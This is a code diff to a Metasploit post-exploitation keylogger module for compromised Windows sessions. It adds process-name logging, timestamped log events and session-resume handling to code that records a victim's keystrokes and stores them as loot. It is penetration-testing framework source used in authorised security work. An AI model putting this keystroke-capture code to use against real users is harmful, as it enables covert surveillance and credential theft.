@@ -49,7 +49,6 @@ class MetasploitModule < Msf::Post
       ], self.class)
   end
 
-
   def run
     print_status("Executing module against #{sysinfo['Computer']}")
     if datastore['MIGRATE']
@@ -76,21 +75,27 @@ class MetasploitModule < Msf::Post
     @logfile = nil
     @timed_out = false
     @timed_out_age = nil  # Session age when it timed out
-
     @interval = datastore['INTERVAL'].to_i
+    @wait = datastore['TimeOutAction'] == "wait" ? true : false
+
     if @interval < 1
       print_error("INTERVAL value out of bounds. Setting to 5.")
       @interval = 5
-    end
-
-    @wait = datastore['TimeOutAction'] == "wait" ? true : false
+    end    
   end
 
   # This function sets the log file and loot entry.
   #
   # @return [StringClass] Returns the path name to the stored loot filename
   def set_log
-    store_loot("host.windows.keystrokes", "text/plain", session, "Keystroke log on #{sysinfo['Computer']} with user #{client.sys.config.getuid} started at #{Time.now.to_s}\n\n", "keystrokes.txt", "User Keystrokes")
+    store_loot("host.windows.keystrokes", "text/plain", session, "Keystroke log from #{get_process_name} on #{sysinfo['Computer']} with user #{client.sys.config.getuid} started at #{Time.now.to_s}\n\n", "keystrokes.txt", "User Keystrokes")
+  end
+
+  # This writes a timestamp event to the output file.
+  #
+  # @return [void] A useful return value is not expected here
+  def time_stamp(event)
+    file_local_write(@logfile,"\nKeylog Recorder #{event} at #{Time.now.to_s}\n\n")
   end
 
   # This locks the Windows screen if so requested in the datastore.
@@ -104,6 +109,22 @@ class MetasploitModule < Msf::Post
     else
       print_error("Screen lock failed")
     end
+  end
+
+  # This function returns the process name that the session is running in.
+  # 
+  # Note: "session.sys.process[proc_name]" will not work when "include Msf::Post::Windows::Priv" is in the module.
+  #
+  # @return [String Class] the session process's name
+  # @return [NilClass] Session match was not found
+  def get_process_name
+    processes = client.sys.process.get_processes
+    processes.each do |proc|
+      if proc['pid'] == session.sys.process.getpid
+        return proc['name']
+      end
+    end
+    return nil
   end
 
   # This function evaluates the capture type and migrates accordingly.
@@ -239,9 +260,7 @@ class MetasploitModule < Msf::Post
   # @return [void] A useful return value is not expected here
   def keycap
     rec = 1
-
     print_status("Keystrokes being saved in to #{@logfile}")
-
     print_status("Recording keystrokes...")
 
     while rec == 1
@@ -261,16 +280,18 @@ class MetasploitModule < Msf::Post
           @timed_out = true
 
           if @wait
-            print_status("Timed out, but waiting.")
+            time_stamp("timed out - now waiting")
+            vprint_status("Session: #{datastore['SESSION']} is not responding. Waiting...")
           else
+            time_stamp("timed out - exiting")
             print_status("Session: #{datastore['SESSION']} is not responding. Exiting keylog recorder.")
             rec = 0
-          end          
+          end
         elsif e.class.to_s == "Interrupt"
-          print_status("User interrupt. Exiting keylog recorder.")
+          print_status("User interrupt.")
           rec = 0
         else
-          print_error("Keylog recorder encountered error: #{e.class} (#{e}) Exiting...")
+          print_error("Keylog recorder on session: #{datastore['SESSION']} encountered error: #{e.class} (#{e}) Exiting...")
           @timed_out = true
           rec = 0
         end
@@ -287,15 +308,18 @@ class MetasploitModule < Msf::Post
   end
 
   # This function makes sure a session is still alive acording to the Framework.
-  # Also, if the session reaches the timeout age whithout checking in it is
-  # assumed to be stale.
+  # It also checks the timed_out flag. Upon resume of session it resets the flag so
+  # that logging can start again.
   #
-  # @return [TrueClass] Session is still alive (Framework) and not stale
-  # @return [FalseClass] Session is dead or deamed stale
+  # @return [TrueClass] Session is still alive (Framework) and not timed out
+  # @return [FalseClass] Session is dead or timed out
   def session_good?
     return false if !session.alive?
     if @timed_out
-      @timed_out = false if get_session_age < @timed_out_age && @wait  #reset timed out to false if module set to wait and session becomes active again.
+      if get_session_age < @timed_out_age && @wait  
+        time_stamp("resumed")
+        @timed_out = false       #reset timed out to false, if module set to wait and session becomes active again.
+      end
       return !@timed_out
     end
     return true
@@ -303,7 +327,7 @@ class MetasploitModule < Msf::Post
 
   # This function is used at module close time to determine if the session
   # might be going state. This help to prevent the module from having to wait until
-  # time-out before exiting which can happen if the session is unresponsive just prior
+  # time-out before exiting. This can happen if the session goes unresponsive just prior
   # to the final call to write_keylog_data or the call to session.ui.keyscan_stop
   #
   # @return [TrueClass] Session is still responding
@@ -317,7 +341,7 @@ class MetasploitModule < Msf::Post
       sleep(10)
       session_age3 = get_session_age
       if session_age3 > session_age2
-        print_status("Session #{datastore['SESSION']} is likely going stale. Stand by...")
+        vprint_status("Session #{datastore['SESSION']} is likely going stale. Stand by...")
         sleep(10)
         return true if get_session_age > session_age3
       end
@@ -347,8 +371,7 @@ class MetasploitModule < Msf::Post
   end
 
   # This function cleans up the module.
-  # finish_up was added for clean exit when this module is run
-  # as a job.
+  # finish_up was added for a clean exit when this module is run as a job.
   #
   # Known Issue: This appears to run twice when killing the job. Not sure why.
   # Does not cause issues with output or errors.
@@ -356,5 +379,6 @@ class MetasploitModule < Msf::Post
   # @return [void] A useful return value is not expected here
   def cleanup
      finish_up if session_good?
+     time_stamp("exited")
   end
 end
